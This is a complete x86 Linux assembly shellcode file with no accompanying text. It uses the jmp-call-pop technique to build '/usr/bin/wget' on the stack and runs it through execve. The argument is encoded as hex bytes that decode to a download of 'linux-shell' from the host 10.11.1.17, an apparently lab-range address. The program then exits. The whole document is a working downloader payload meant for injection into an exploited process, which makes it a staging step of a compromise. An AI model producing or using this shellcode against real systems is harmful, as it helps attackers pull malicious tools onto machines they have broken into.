global _start

section .text

_start:

jmp short call_shellcode

shellcode:

pop ecx			; jmp call pop - hostname

xor edx, edx		; clear edx
mul edx			; clear eax

mov al, 0xb		; execve() syscall #

push 0x74		; t
push 0x6567772f		; egw/
push 0x6e69622f		; nib/
push 0x7273752f		; rsu/
mov ebx, esp		; save args

push edx		; null
push ecx		; hostname from jmp call pop
push ebx		; wget args
mov ecx, esp		; save args
int 0x80

inc eax			; success eax = 0, then inc to 0x1 for exit() syscall
int 0x80		; exit

call_shellcode:

call shellcode

hostname: db  0x31,0x30,0x2e,0x31,0x31,0x2e,0x31,0x2e,0x31,0x37,0x2f,0x6c,0x69,0x6e,0x75,0x78,0x2d,0x73,0x68,0x65,0x6c,0x6c
